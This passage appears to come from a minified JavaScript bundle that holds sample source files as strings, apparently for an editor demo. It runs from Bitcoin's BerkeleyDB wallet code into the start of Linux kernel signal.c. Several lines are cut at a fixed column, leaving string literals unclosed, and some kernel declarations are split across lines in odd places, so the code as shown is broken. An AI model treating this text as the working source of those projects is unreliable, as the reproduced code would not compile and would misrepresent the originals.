(ret != 0) {\n    throw std::runtime_error(strprintf(\n        "BerkeleyDatabase: Can\'t open database %s (get_fileid failed with %d)",\n        filename, ret));\n  }\n\n  for (const auto &item : env.m_fileids) {\n    if (fileid == item.second && &fileid != &item.second) {\n      throw std::runtime_error(strprintf(\n          "BerkeleyDatabase: Can\'t open database %s (duplicates fileid %s from %\n          filename,\n          HexStr(item.second.value), item.first));\n    }\n  }\n}\n\nRecursiveMutex cs_db;\nstd::map <std::string, std::weak_ptr<BerkeleyEnvironment>> g_dbenvs\nGUARDED_BY(cs_db); //!< Map from directory name to db environment.\n} // namespace\n\nbool\nWalletDatabaseFileId::operator==(const WalletDatabaseFileId &rhs) const {\nreturn memcmp(value, &rhs.value, sizeof(value)) == 0;\n}\n\nstd::shared_ptr <BerkeleyEnvironment>\nGetBerkeleyEnv(const fs::path &env_directory, bool use_shared_memory) {\nLOCK(cs_db);\nauto inserted = g_dbenvs.emplace(fs::PathToString(env_directory),\n                                 std::weak_ptr<BerkeleyEnvironment>());\nif (inserted.second) {\n  auto env = std::make_shared<BerkeleyEnvironment>(env_directory,\n                                                   use_shared_memory);\n  inserted.first->second = env;\n  return env;\n}\nreturn inserted.first->second.lock();\n}\n\nvoid BerkeleyEnvironment::Close() {\n  if (!fDbEnvInit)\n    return;\n\n  fDbEnvInit = false;\n\n  for (auto &db : m_databases) {\n    BerkeleyDatabase &database = db.second.get();\n    assert(database.m_refcount <= 0);\n    if (database.m_db) {\n      database.m_db->close(0);\n      database.m_db.reset();\n    }\n  }\n\n  FILE *error_file = nullptr;\n  dbenv->get_errfile(&error_file);\n\n  int ret = dbenv->close(0);\n  if (ret != 0)\n    LogPrintf(\n        "BerkeleyEnvironment::Close: Error %d closing database environment: %s\\n\n        ret, DbEnv::strerror(ret));\n  if (!fMockDb)\n    DbEnv((u_int32_t) 0).remove(strPath.c_str(), 0);\n\n  if (error_file) fclose(error_file);\n\n  UnlockDirectory(fs::PathFromString(strPath), ".walletlock");\n}\n\nvoid BerkeleyEnvironment::Reset() {\n  dbenv.reset(new DbEnv(DB_CXX_NO_EXCEPTIONS));\n  fDbEnvInit = false;\n  fMockDb = false;\n}\n\nBerkeleyEnvironment::BerkeleyEnvironment(const fs::path &dir_path,\n                                         bool use_shared_memory) : strPath(\n    fs::PathToString(dir_path)), m_use_shared_memory(\n    use_shared_memory) {\n  Reset();\n}\n\nBerkeleyEnvironment::~BerkeleyEnvironment() {\n  LOCK(cs_db);\n  g_dbenvs.erase(strPath);\n  Close();\n}\n\n//! Construct an in-memory mock Berkeley environment for testing\nBerkeleyEnvironment::BerkeleyEnvironment() : m_use_shared_memory(false) {\n  Reset();\n\n  LogPrint(BCLog::WALLETDB, "BerkeleyEnvironment::MakeMock\\n");\n\n  dbenv->set_cachesize(1, 0, 1);\n  dbenv->set_lg_bsize(10485760 * 4);\n  dbenv->set_lg_max(10485760);\n  dbenv->set_lk_max_locks(10000);\n  dbenv->set_lk_max_objects(10000);\n  dbenv->set_flags(DB_AUTO_COMMIT, 1);\n  dbenv->log_set_config(DB_LOG_IN_MEMORY, 1);\n  int ret = dbenv->open(nullptr,\n                        DB_CREATE |\n                        DB_INIT_LOCK |\n                        DB_INIT_LOG |\n                        DB_INIT_MPOOL |\n                        DB_INIT_TXN |\n                        DB_THREAD |\n                        DB_PRIVATE,\n                        S_IRUSR | S_IWUSR);\n  if (ret > 0) {\n    throw std::runtime_error(strprintf(\n        "BerkeleyEnvironment::MakeMock: Error %d opening database environment.",\n        ret));\n  }\n\n  fDbEnvInit = true;\n  fMockDb = true;\n}\n\nBerkeleyBatch::SafeDbt::SafeDbt() {\n  m_dbt.set_flags(DB_DBT_MALLOC);\n}\n\nBerkeleyBatch::SafeDbt::SafeDbt(void *data, size_t size)\n    : m_dbt(data, size) {\n}\n\nBerkeleyBatch::SafeDbt::~SafeDbt() {\n  if (m_dbt.get_data() != nullptr) {\n    // Clear memory, e.g. in case it was a private key\n    memory_cleanse(m_dbt.get_data(), m_dbt.get_size());\n    // under DB_DBT_MALLOC, data is malloced by the Dbt, but must be\n    // freed by the caller.\n    // https://docs.oracle.com/cd/E17275_01/html/api_reference/C/dbt.html\n    if (m_dbt.get_flags() & DB_DBT_MALLOC) {\n      free(m_dbt.get_data());\n    }\n  }\n}\n\nconst void *BerkeleyBatch::SafeDbt::get_data() const {\n  return m_dbt.get_data();\n}\n\nu_int32_t BerkeleyBatch::SafeDbt::get_size() const {\n  return m_dbt.get_size();\n}\n\nBerkeleyBatch::SafeDbt::operator Dbt *() {\n  return &m_dbt;\n}\n\nbool BerkeleyDatabase::Verify(bilingual_str &errorStr) {\n  fs::path walletDir = env->Directory();\n  fs::path file_path = walletDir / strFile;\n\n  LogPrintf("Using BerkeleyDB version %s\\n", BerkeleyDatabaseVersion());\n  LogPrintf("Using wallet %s\\n", fs::PathToString(file_path));\n\n  if (!env->Open(errorStr)) {\n    return false;\n  }\n\n  if (fs::exists(file_path)) {\n    assert(m_refcount == 0);\n\n    Db db(env->dbenv.get(), 0);\n    int result = db.verify(strFile.c_str(), nullptr, nullptr, 0);\n    if (result != 0) {\n      errorStr = strprintf(\n          _("%s corrupt. Try using the wallet tool bitcoin-wallet to salvage or \n          fs::quoted(fs::PathToString(file_path)));\n      return false;\n    }\n  }\n  // also return true if files does not exists\n  return true;\n}\n\nvoid BerkeleyEnvironment::CheckpointLSN(const std::string &strFile) {\n  dbenv->txn_checkpoint(0, 0, 0);\n  if (fMockDb)\n    return;\n  dbenv->lsn_reset(strFile.c_str(), 0);\n}\n\nBerkeleyDatabase::~BerkeleyDatabase() {\n  if (env) {\n    LOCK(cs_db);\n    env->CloseDb(strFile);\n    assert(!m_db);\n    size_t erased = env->m_databases.erase(strFile);\n    assert(erased == 1);\n    env->m_fileids.erase(strFile);\n  }\n}\n\nBerkeleyBatch::BerkeleyBatch(BerkeleyDatabase &database,\n                             const bool read_only, bool fFlushOnCloseIn)\n    : pdb(nullptr), activeTxn(nullptr), m_cursor(nullptr),\n      m_database(database) {\n  database.AddRef();\n  database.Open();\n  fReadOnly = read_only;\n  fFlushOnClose = fFlushOnCloseIn;\n  env = database.env.get();\n  pdb = database.m_db.get();\n  strFile = database.strFile;\n  if (!Exists(std::string("version"))) {\n    bool fTmp = fReadOnly;\n    fReadOnly = false;\n    Write(std::string("version"), CLIENT_VERSION);\n    fReadOnly = fTmp;\n  }\n}\n\nvoid BerkeleyDatabase::Open() {\n  unsigned int nFlags = DB_THREAD | DB_CREATE;\n\n  {\n    LOCK(cs_db);\n    bilingual_str open_err;\n    if (!env->Open(open_err))\n      throw std::runtime_error(\n          "BerkeleyDatabase: Failed to open database environment.");\n\n    if (m_db == nullptr) {\n      int ret;\n      std::unique_ptr <Db> pdb_temp = std::make_unique<Db>(\n          env->dbenv.get(), 0);\n\n      bool fMockDb = env->IsMock();\n      if (fMockDb) {\n        DbMpoolFile *mpf = pdb_temp->get_mpf();\n        ret = mpf->set_flags(DB_MPOOL_NOFILE, 1);\n        if (ret != 0) {\n          throw std::runtime_error(strprintf(\n              "BerkeleyDatabase: Failed to configure for no temp file backing fo\n              strFile));\n        }\n      }\n\n      ret = pdb_temp->open(\n          nullptr,                             // Txn pointer\n          fMockDb ? nullptr : strFile.c_str(),      // Filename\n          fMockDb ? strFile.c_str()\n                  : "main",       // Logical db name\n          DB_BTREE,                                 // Database type\n          nFlags,                                   // Flags\n          0);\n\n      if (ret != 0) {\n        throw std::runtime_error(strprintf(\n            "BerkeleyDatabase: Error %d, can\'t open database %s",\n            ret, strFile));\n      }\n\n      // Call CheckUniqueFileid on the containing BDB environment to\n      // avoid BDB data consistency bugs that happen when different data\n      // files in the same environment have the same fileid.\n      CheckUniqueFileid(*env, strFile, *pdb_temp,\n                        this->env->m_fileids[strFile]);\n\n      m_db.reset(pdb_temp.release());\n\n    }\n  }\n}\n\nvoid BerkeleyBatch::Flush() {\n  if (activeTxn)\n    return;\n\n  // Flush database activity from memory pool to disk log\n  unsigned int nMinutes = 0;\n  if (fReadOnly)\n    nMinutes = 1;\n\n  if (env) { // env is nullptr for dummy databases (i.e. in tests). Don\'t actual\n    env->dbenv->txn_checkpoint(\n        nMinutes ? m_database.m_max_log_mb * 1024 : 0, nMinutes, 0);\n  }\n}\n\nvoid BerkeleyDatabase::IncrementUpdateCounter() {\n  ++nUpdateCounter;\n}\n\nBerkeleyBatch::~BerkeleyBatch() {\n  Close();\n  m_database.RemoveRef();\n}\n\nvoid BerkeleyBatch::Close() {\n  if (!pdb)\n    return;\n  if (activeTxn)\n    activeTxn->abort();\n  activeTxn = nullptr;\n  pdb = nullptr;\n  CloseCursor();\n\n  if (fFlushOnClose)\n    Flush();\n}\n\nvoid BerkeleyEnvironment::CloseDb(const std::string &strFile) {\n  {\n    LOCK(cs_db);\n    auto it = m_databases.find(strFile);\n    assert(it != m_databases.end());\n    BerkeleyDatabase &database = it->second.get();\n    if (database.m_db) {\n      // Close the database handle\n      database.m_db->close(0);\n      database.m_db.reset();\n    }\n  }\n}\n\nvoid BerkeleyEnvironment::ReloadDbEnv() {\n  // Make sure that no Db\'s are in use\n  AssertLockNotHeld(cs_db);\n  std::unique_lock <RecursiveMutex> lock(cs_db);\n  m_db_in_use.wait(lock, [this]() {\n    for (auto &db : m_databases) {\n      if (db.second.get().m_refcount > 0) return false;\n    }\n    return true;\n  });\n\n  std::vector <std::string> filenames;\n  for (auto it : m_databases) {\n    filenames.push_back(it.first);\n  }\n  // Close the individual Db\'s\n  for (const std::string &filename : filenames) {\n    CloseDb(filename);\n  }\n  // Reset the environment\n  Flush(true); // This will flush and close the environment\n  Reset();\n  bilingual_str open_err;\n  Open(open_err);\n}\n\nbool BerkeleyDatabase::Rewrite(const char *pszSkip) {\n  while (true) {\n    {\n      LOCK(cs_db);\n      if (m_refcount <= 0) {\n        // Flush log data to the dat file\n        env->CloseDb(strFile);\n        env->CheckpointLSN(strFile);\n        m_refcount = -1;\n\n        bool fSuccess = true;\n        LogPrintf("BerkeleyBatch::Rewrite: Rewriting %s...\\n",\n                  strFile);\n        std::string strFileRes = strFile + ".rewrite";\n        { // surround usage of db with extra {}\n          BerkeleyBatch db(*this, true);\n          std::unique_ptr <Db> pdbCopy = std::make_unique<Db>(\n              env->dbenv.get(), 0);\n\n          int ret = pdbCopy->open(\n              nullptr,               // Txn pointer\n              strFileRes.c_str(), // Filename\n              "main",             // Logical db name\n              DB_BTREE,           // Database type\n              DB_CREATE,          // Flags\n              0);\n          if (ret > 0) {\n            LogPrintf(\n                "BerkeleyBatch::Rewrite: Can\'t create database file %s\\n",\n                strFileRes);\n            fSuccess = false;\n          }\n\n          if (db.StartCursor()) {\n            while (fSuccess) {\n              CDataStream ssKey(SER_DISK, CLIENT_VERSION);\n              CDataStream ssValue(SER_DISK, CLIENT_VERSION);\n              bool complete;\n              bool ret1 = db.ReadAtCursor(ssKey, ssValue,\n                                          complete);\n              if (complete) {\n                break;\n              } else if (!ret1) {\n                fSuccess = false;\n                break;\n              }\n              if (pszSkip &&\n                  strncmp((const char *) ssKey.data(),\n                          pszSkip, std::min(ssKey.size(),\n                                            strlen(pszSkip))) ==\n                  0)\n                continue;\n              if (strncmp((const char *) ssKey.data(),\n                          "\\x07version", 8) == 0) {\n                // Update version:\n                ssValue.clear();\n                ssValue << CLIENT_VERSION;\n              }\n              Dbt datKey(ssKey.data(), ssKey.size());\n              Dbt datValue(ssValue.data(), ssValue.size());\n              int ret2 = pdbCopy->put(nullptr, &datKey,\n                                      &datValue,\n                                      DB_NOOVERWRITE);\n              if (ret2 > 0)\n                fSuccess = false;\n            }\n            db.CloseCursor();\n          }\n          if (fSuccess) {\n            db.Close();\n            env->CloseDb(strFile);\n            if (pdbCopy->close(0))\n              fSuccess = false;\n          } else {\n            pdbCopy->close(0);\n          }\n        }\n        if (fSuccess) {\n          Db dbA(env->dbenv.get(), 0);\n          if (dbA.remove(strFile.c_str(), nullptr, 0))\n            fSuccess = false;\n          Db dbB(env->dbenv.get(), 0);\n          if (dbB.rename(strFileRes.c_str(), nullptr,\n                         strFile.c_str(), 0))\n            fSuccess = false;\n        }\n        if (!fSuccess)\n          LogPrintf(\n              "BerkeleyBatch::Rewrite: Failed to rewrite database file %s\\n",\n              strFileRes);\n        return fSuccess;\n      }\n    }\n    UninterruptibleSleep(std::chrono::milliseconds{100});\n  }\n}\n\n\nvoid BerkeleyEnvironment::Flush(bool fShutdown) {\n  int64_t nStart = GetTimeMillis();\n  // Flush log data to the actual data file on all files that are not in use\n  LogPrint(BCLog::WALLETDB,\n           "BerkeleyEnvironment::Flush: [%s] Flush(%s)%s\\n", strPath,\n           fShutdown ? "true" : "false",\n           fDbEnvInit ? "" : " database not started");\n  if (!fDbEnvInit)\n    return;\n  {\n    LOCK(cs_db);\n    bool no_dbs_accessed = true;\n    for (auto &db_it : m_databases) {\n      std::string strFile = db_it.first;\n      int nRefCount = db_it.second.get().m_refcount;\n      if (nRefCount < 0) continue;\n      LogPrint(BCLog::WALLETDB,\n               "BerkeleyEnvironment::Flush: Flushing %s (refcount = %d)...\\n",\n               strFile, nRefCount);\n      if (nRefCount == 0) {\n        // Move log data to the dat file\n        CloseDb(strFile);\n        LogPrint(BCLog::WALLETDB,\n                 "BerkeleyEnvironment::Flush: %s checkpoint\\n",\n                 strFile);\n        dbenv->txn_checkpoint(0, 0, 0);\n        LogPrint(BCLog::WALLETDB,\n                 "BerkeleyEnvironment::Flush: %s detach\\n",\n                 strFile);\n        if (!fMockDb)\n          dbenv->lsn_reset(strFile.c_str(), 0);\n        LogPrint(BCLog::WALLETDB,\n                 "BerkeleyEnvironment::Flush: %s closed\\n",\n                 strFile);\n        nRefCount = -1;\n      } else {\n        no_dbs_accessed = false;\n      }\n    }\n    LogPrint(BCLog::WALLETDB,\n             "BerkeleyEnvironment::Flush: Flush(%s)%s took %15dms\\n",\n             fShutdown ? "true" : "false",\n             fDbEnvInit ? "" : " database not started",\n             GetTimeMillis() - nStart);\n    if (fShutdown) {\n      char **listp;\n      if (no_dbs_accessed) {\n        dbenv->log_archive(&listp, DB_ARCH_REMOVE);\n        Close();\n        if (!fMockDb) {\n          fs::remove_all(\n              fs::PathFromString(strPath) / "database");\n        }\n      }\n    }\n  }\n}\n\nbool BerkeleyDatabase::PeriodicFlush() {\n  // Don\'t flush if we can\'t acquire the lock.\n  TRY_LOCK(cs_db, lockDb);\n  if (!lockDb) return false;\n\n  // Don\'t flush if any databases are in use\n  for (auto &it : env->m_databases) {\n    if (it.second.get().m_refcount > 0) return false;\n  }\n\n  // Don\'t flush if there haven\'t been any batch writes for this database.\n  if (m_refcount < 0) return false;\n\n  LogPrint(BCLog::WALLETDB, "Flushing %s\\n", strFile);\n  int64_t nStart = GetTimeMillis();\n\n  // Flush wallet file so it\'s self contained\n  env->CloseDb(strFile);\n  env->CheckpointLSN(strFile);\n  m_refcount = -1;\n\n  LogPrint(BCLog::WALLETDB, "Flushed %s %dms\\n", strFile,\n           GetTimeMillis() - nStart);\n\n  return true;\n}\n\nbool BerkeleyDatabase::Backup(const std::string &strDest) const {\n  while (true) {\n    {\n      LOCK(cs_db);\n      if (m_refcount <= 0) {\n        // Flush log data to the dat file\n        env->CloseDb(strFile);\n        env->CheckpointLSN(strFile);\n\n        // Copy wallet file\n        fs::path pathSrc = env->Directory() / strFile;\n        fs::path pathDest(fs::PathFromString(strDest));\n        if (fs::is_directory(pathDest))\n          pathDest /= fs::PathFromString(strFile);\n\n        try {\n          if (fs::exists(pathDest) &&\n              fs::equivalent(pathSrc, pathDest)) {\n            LogPrintf(\n                "cannot backup to wallet source file %s\\n",\n                fs::PathToString(pathDest));\n            return false;\n          }\n\n          fs::copy_file(pathSrc, pathDest,\n                        fs::copy_options::overwrite_existing);\n          LogPrintf("copied %s to %s\\n", strFile,\n                    fs::PathToString(pathDest));\n          return true;\n        } catch (const fs::filesystem_error &e) {\n          LogPrintf("error copying %s to %s - %s\\n", strFile,\n                    fs::PathToString(pathDest),\n                    fsbridge::get_filesystem_error_message(e));\n          return false;\n        }\n      }\n    }\n    UninterruptibleSleep(std::chrono::milliseconds{100});\n  }\n}\n\nvoid BerkeleyDatabase::Flush() {\n  env->Flush(false);\n}\n\nvoid BerkeleyDatabase::Close() {\n  env->Flush(true);\n}\n\nvoid BerkeleyDatabase::ReloadDbEnv() {\n  env->ReloadDbEnv();\n}\n\nbool BerkeleyBatch::StartCursor() {\n  assert(!m_cursor);\n  if (!pdb)\n    return false;\n  int ret = pdb->cursor(nullptr, &m_cursor, 0);\n  return ret == 0;\n}\n\nbool BerkeleyBatch::ReadAtCursor(CDataStream &ssKey, CDataStream &ssValue,\n                                 bool &complete) {\n  complete = false;\n  if (m_cursor == nullptr) return false;\n  // Read at cursor\n  SafeDbt datKey;\n  SafeDbt datValue;\n  int ret = m_cursor->get(datKey, datValue, DB_NEXT);\n  if (ret == DB_NOTFOUND) {\n    complete = true;\n  }\n  if (ret != 0)\n    return false;\n  else if (datKey.get_data() == nullptr || datValue.get_data() == nullptr)\n    return false;\n\n  // Convert to streams\n  ssKey.SetType(SER_DISK);\n  ssKey.clear();\n  ssKey.write({BytePtr(datKey.get_data()), datKey.get_size()});\n  ssValue.SetType(SER_DISK);\n  ssValue.clear();\n  ssValue.write({BytePtr(datValue.get_data()), datValue.get_size()});\n  return true;\n}\n\nvoid BerkeleyBatch::CloseCursor() {\n  if (!m_cursor) return;\n  m_cursor->close();\n  m_cursor = nullptr;\n}\n\nbool BerkeleyBatch::TxnBegin() {\n  if (!pdb || activeTxn)\n    return false;\n  DbTxn *ptxn = env->TxnBegin();\n  if (!ptxn)\n    return false;\n  activeTxn = ptxn;\n  return true;\n}\n\nbool BerkeleyBatch::TxnCommit() {\n  if (!pdb || !activeTxn)\n    return false;\n  int ret = activeTxn->commit(0);\n  activeTxn = nullptr;\n  return (ret == 0);\n}\n\nbool BerkeleyBatch::TxnAbort() {\n  if (!pdb || !activeTxn)\n    return false;\n  int ret = activeTxn->abort();\n  activeTxn = nullptr;\n  return (ret == 0);\n}\n\nbool BerkeleyDatabaseSanityCheck() {\n  int major, minor;\n  DbEnv::version(&major, &minor, nullptr);\n\n  /* If the major version differs, or the minor version of library is *older*\n   * than the header that was compiled against, flag an error.\n   */\n  if (major != DB_VERSION_MAJOR || minor < DB_VERSION_MINOR) {\n    LogPrintf(\n        "BerkeleyDB database version conflict: header version is %d.%d, library \n        DB_VERSION_MAJOR, DB_VERSION_MINOR, major, minor);\n    return false;\n  }\n\n  return true;\n}\n\nstd::string BerkeleyDatabaseVersion() {\n  return DbEnv::version(nullptr, nullptr, nullptr);\n}\n\nbool BerkeleyBatch::ReadKey(CDataStream &&key, CDataStream &value) {\n  if (!pdb)\n    return false;\n\n  SafeDbt datKey(key.data(), key.size());\n\n  SafeDbt datValue;\n  int ret = pdb->get(activeTxn, datKey, datValue, 0);\n  if (ret == 0 && datValue.get_data() != nullptr) {\n    value.write({BytePtr(datValue.get_data()), datValue.get_size()});\n    return true;\n  }\n  return false;\n}\n\nbool BerkeleyBatch::WriteKey(CDataStream &&key, CDataStream &&value,\n                             bool overwrite) {\n  if (!pdb)\n    return false;\n  if (fReadOnly)\n    assert(!"Write called on database in read-only mode");\n\n  SafeDbt datKey(key.data(), key.size());\n\n  SafeDbt datValue(value.data(), value.size());\n\n  int ret = pdb->put(activeTxn, datKey, datValue,\n                     (overwrite ? 0 : DB_NOOVERWRITE));\n  return (ret == 0);\n}\n\nbool BerkeleyBatch::EraseKey(CDataStream &&key) {\n  if (!pdb)\n    return false;\n  if (fReadOnly)\n    assert(!"Erase called on database in read-only mode");\n\n  SafeDbt datKey(key.data(), key.size());\n\n  int ret = pdb->del(activeTxn, datKey, 0);\n  return (ret == 0 || ret == DB_NOTFOUND);\n}\n\nbool BerkeleyBatch::HasKey(CDataStream &&key) {\n  if (!pdb)\n    return false;\n\n  SafeDbt datKey(key.data(), key.size());\n\n  int ret = pdb->exists(activeTxn, datKey, 0);\n  return ret == 0;\n}\n\nvoid BerkeleyDatabase::AddRef() {\n  LOCK(cs_db);\n  if (m_refcount < 0) {\n    m_refcount = 1;\n  } else {\n    m_refcount++;\n  }\n}\n\nvoid BerkeleyDatabase::RemoveRef() {\n  LOCK(cs_db);\n  m_refcount--;\n  if (env) env->m_db_in_use.notify_all();\n}\n\nstd::unique_ptr <DatabaseBatch>\nBerkeleyDatabase::MakeBatch(bool flush_on_close) {\n  return std::make_unique<BerkeleyBatch>(*this, false, flush_on_close);\n}\n\nstd::unique_ptr <BerkeleyDatabase>\nMakeBerkeleyDatabase(const fs::path &path, const DatabaseOptions &options,\n                     DatabaseStatus &status, bilingual_str &error) {\n  fs::path data_file = BDBDataFile(path);\n  std::unique_ptr <BerkeleyDatabase> db;\n  {\n    LOCK(\n        cs_db); // Lock env.m_databases until insert in BerkeleyDatabase constru\n    std::string data_filename = fs::PathToString(data_file.filename());\n    std::shared_ptr <BerkeleyEnvironment> env = GetBerkeleyEnv(\n        data_file.parent_path(), options.use_shared_memory);\n    if (env->m_databases.count(data_filename)) {\n      error = Untranslated(strprintf(\n          "Refusing to load database. Data file \'%s\' is already loaded.",\n          fs::PathToString(env->Directory() / data_filename)));\n      status = DatabaseStatus::FAILED_ALREADY_LOADED;\n      return nullptr;\n    }\n    db = std::make_unique<BerkeleyDatabase>(std::move(env),\n                                            std::move(data_filename),\n                                            options);\n  }\n\n  if (options.verify && !db->Verify(error)) {\n    status = DatabaseStatus::FAILED_VERIFY;\n    return nullptr;\n  }\n\n  status = DatabaseStatus::SUCCESS;\n  return db;\n}\n} // namespace wallet')},get dt(){return delete this.dt,this.dt=405}}]}},{numCols:81,get streams(){return[{get title(){delete this.title;return this.title=x(["linux - signal.c","Editor - C","C"])},get stream(){return delete this.stream,this.stream=E('// SPDX-License-Identifier: GPL-2.0-only\n/*\n *  linux/kernel/signal.c\n *\n *  Copyright (C) 1991, 1992  Linus Torvalds\n *\n *  1997-11-02  Modified for POSIX.1b signals by Richard Henderson\n *\n *  2003-06-02  Jim Houston - Concurrent Computer Corp.\n *    Changes to use preallocated sigqueue structures\n *    to allow signals to be sent reliably.\n */\n\n\n#include <linux/slab.h>\n#include <linux/export.h>\n#include <linux/init.h>\n#include <linux/sched/mm.h>\n#include <linux/sched/user.h>\n#include <linux/sched/debug.h>\n#include <linux/sched/task.h>\n#include <linux/sched/task_stack.h>\n#include <linux/sched/cputime.h>\n#include <linux/file.h>\n#include <linux/fs.h>\n#include <linux/proc_fs.h>\n#include <linux/tty.h>\n#include <linux/binfmts.h>\n#include <linux/coredump.h>\n#include <linux/security.h>\n#include <linux/syscalls.h>\n#include <linux/ptrace.h>\n#include <linux/signal.h>\n#include <linux/signalfd.h>\n#include <linux/ratelimit.h>\n#include <linux/tracehook.h>\n#include <linux/capability.h>\n#include <linux/freezer.h>\n#include <linux/pid_namespace.h>\n#include <linux/nsproxy.h>\n#include <linux/user_namespace.h>\n#include <linux/uprobes.h>\n#include <linux/compat.h>\n#include <linux/cn_proc.h>\n#include <linux/compiler.h>\n#include <linux/posix-timers.h>\n#include <linux/cgroup.h>\n#include <linux/audit.h>\n\n#define CREATE_TRACE_POINTS\n\n#include <trace/events/signal.h>\n\n#include <asm/param.h>\n#include <linux/uaccess.h>\n#include <asm/unistd.h>\n#include <asm/siginfo.h>\n#include <asm/cacheflush.h>\n#include <asm/syscall.h>\n\nstatic struct kmem_cache *sigqueue_cachep;\n\nint print_fatal_signals\n__read_mostly;\n\nstatic void __user\n*\n\nsig_handler(struct task_struct *t, int sig) {\n  return t->sighand->action[sig - 1].sa.sa_handler;\n}\n\nstatic inline bool sig_handler_ignored(void __user\n\n*handler,\nint sig\n)\n{\n\nreturn handler == SIG_IGN ||\n(handler ==\nSIG_DFL &&sig_kernel_ignore(sig)\n);\n}\n\nstatic bool sig_task_ignored(struct task_struct *t, int sig, bool force) {\n  void __user\n  *handler;\n\n  handler = sig_handler(t, sig);\n\n  if (unlikely(is_global_init(t) && sig_kernel_only(sig)))\n    return true;\n\n  if (unlikely(t->signal->flags & SIGNAL_UNKILLABLE) &&\n      handler == SIG_DFL && !(force && sig_kernel_only(sig)))\n    return true;\n\n  if (unlikely((t->flags & PF_KTHREAD) &&\n               (handler == SIG_KTHREAD_KERNEL) && !force))\n    return true;\n\n  return sig_handler_ignored(handler, sig);\n}\n\nstatic bool sig_ignored(struct task_struct *t, int sig, bool force) {\n\n  if (sigismember(&t->blocked, sig) || sigismember(&t->real_blocked, sig))\n    return false;\n\n  if (t->ptrace && sig != SIGKILL)\n    return false;\n\n  return sig_task_ignored(t, sig, force);\n}\n\nstatic inline bool has_pending_signals(sigset_t *signal, sigset_t *blocked) {\n  unsigned long ready;\n  long i;\n\n  switch (_NSIG_WORDS) {\n    default:\n      for (i = _NSIG_WORDS, ready = 0; --i >= 0;)\n        ready |= signal->sig[i] & ~blocked->sig[i];\n      break;\n\n    case 4:\n      ready = signal->sig[3] & ~blocked->sig[3];\n      ready |= signal->sig[2] & ~blocked->sig[2];\n      ready |= signal->sig[1] & ~blocked->sig[1];\n      ready |= signal->sig[0] & ~blocked->sig[0];\n      break;\n\n    case 2:\n      ready = signal->sig[1] & ~blocked->sig[1];\n      ready |= signal->sig[0] & ~blocked->sig[0];\n      break;\n\n    case 1:\n      ready = signal->sig[0] & ~blocked->sig[0];\n  }\n  return ready != 0;\n}\n\n#define PENDING(p, b) has_pending_signals(&(p)->signal, (b))\n\nstatic bool recalc_sigpending_tsk(struct task_struct *t) {\n  if ((t->jobctl & (JOBCTL_PENDING_MASK | JOBCTL_TRAP_FREEZE)) ||\n      PENDING(&t->pending, &t->blocked) ||\n      PENDING(&t->signal->shared_pending, &t->blocked) ||\n      cgroup_task_frozen(t)) {\n    set_tsk_thread_flag(t, TIF_SIGPENDING);\n    return true;\n  }\n\n  return false;\n}\n\nvoid recalc_sigpending_and_wake(struct task_struct *t) {\n  if (recalc_sigpending_tsk(t))\n    signal_wake_up(t, 0);\n}\n\nvoid recalc_sigpending(void) {\n  if (!recalc_sigpending_tsk(current) && !freezing(current))\n    clear_thread_flag(TIF_SIGPENDING);\n\n}\n\nEXPORT_SYMBOL(recalc_sigpending);\n\nvoid calculate_sigpending(void) {\n  spin_lock_irq(&current->sighand->siglock);\n  set_tsk_thread_flag(current, TIF_SIGPENDING);\n  recalc_sigpending();\n  spin_unlock_irq(&current->sighand->siglock);\n}\n\n#define SYNCHRONOUS_MASK \\\n  (sigmask(SIGSEGV) | sigmask(SIGBUS) | sigmask(SIGILL) | \\\n   sigmask(SIGTRAP) | sigmask(SIGFPE) | sigmask(SIGSYS))\n\nint next_signal(struct sigpending *pending, sigset_t *mask) {\n  unsigned long i, *s, *m, x;\n  int sig = 0;\n\n  s = pending->signal.sig;\n  m = mask->sig;\n\n  x = *s & ~*m;\n  if (x) {\n    if (x & SYNCHRONOUS_MASK)\n      x &= SYNCHRONOUS_MASK;\n    sig = ffz(~x) + 1;\n    return sig;\n  }\n\n  switch (_NSIG_WORDS) {\n    default:\n      for (i = 1; i < _NSIG_WORDS; ++i) {\n        x = *++s & ~*++m;\n        if (!x)\n          continue;\n        sig = ffz(~x) + i * _NSIG_BPW + 1;\n        break;\n      }\n      break;\n\n    case 2:\n      x = s[1] & ~m[1];\n      if (!x)\n        break;\n      sig = ffz(~x) + _NSIG_BPW + 1;\n      break;\n\n    case 1:\n\n      break;\n  }\n\n  return sig;\n}\n\nstatic inline void print_dropped_signal(int sig) {\n  static DEFINE_RATELIMIT_STATE(ratelimit_state,\n  5 * HZ, 10);\n\n  if (!print_fatal_signals)\n    return;\n\n  if (!__ratelimit(&ratelimit_state))\n    return;\n\n  pr_info("%s/%d: reached RLIMIT_SIGPENDING, dropped signal %d\\n",\n          current->comm, current->pid, sig);\n}\n\nbool task_set_jobctl_pending(struct task_struct *task, unsigned long mask) {\n  BUG_ON(mask & ~(JOBCTL_PENDING_MASK | JOBCTL_STOP_CONSUME |\n                  JOBCTL_STOP_SIGMASK | JOBCTL_TRAPPING));\n  BUG_ON((mask & JOBCTL_TRAPPING) && !(mask & JOBCTL_PENDING_MASK));\n\n  if (unlikely(fatal_signal_pending(task) || (task->flags & PF_EXITING)))\n    return false;\n\n  if (mask & JOBCTL_STOP_SIGMASK)\n    task->jobctl &= ~JOBCTL_STOP_SIGMASK;\n\n  task->jobctl |= mask;\n  return true;\n}\n\nvoid task_clear_jobctl_trapping(struct task_struct *task) {\n  if (unlikely(task->jobctl & JOBCTL_TRAPPING)) {\n    task->jobctl &= ~JOBCTL_TRAPPING;\n    smp_mb();\n    wake_up_bit(&task->jobctl, JOBCTL_TRAPPING_BIT);\n  }\n}\n\nvoid task_clear_jobctl_pending(struct task_struct *task, unsigned long mask) {\n  BUG_ON(mask & ~JOBCTL_PENDING_MASK);\n\n  if (mask & JOBCTL_STOP_PENDING)\n    mask |= JOBCTL_STOP_CONSUME | JOBCTL_STOP_DEQUEUED;\n\n  task->jobctl &= ~mask;\n\n  if (!(task->jobctl & JOBCTL_PENDING_MASK))\n    task_clear_jobctl_trapping(task);\n}\n\nstatic bool task_participate_group_stop(struct task_struct *task) {\n  struct signal_struct *sig = task->signal;\n  bool consume = task->jobctl & JOBCTL_STOP_CONSUME;\n\n  WARN_ON_ONCE(!(task->jobctl & JOBCTL_STOP_PENDING));\n\n  task_clear_jobctl_pending(task, JOBCTL_STOP_PENDING);\n\n  if (!consume)\n    return false;\n\n  if (!WARN_ON_ONCE(sig->group_stop_count == 0))\n    sig->group_stop_count--;\n\n  if (!sig->group_stop_count && !(sig->flags & SIGNAL_STOP_STOPPED)) {\n    signal_set_stop_flags(sig, SIGNAL_STOP_STOPPED);\n    return true;\n  